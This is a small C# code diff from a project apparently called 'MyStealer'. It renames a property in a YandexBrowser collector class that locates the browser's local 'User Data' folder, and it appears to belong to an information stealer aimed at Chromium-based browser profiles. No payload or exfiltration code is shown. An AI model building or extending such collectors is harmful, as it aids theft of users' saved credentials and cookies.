@@ -5,7 +5,7 @@ namespace MyStealer.Collectors.Browser.ChromiumBased
 {
     internal class YandexBrowser : Chromium
     {
-        public override string ApplicationName => "Yandex Browser";
+        public override string ModuleName => "Yandex Browser";
 
         protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex", "YandexBrowser", "User Data");
     }
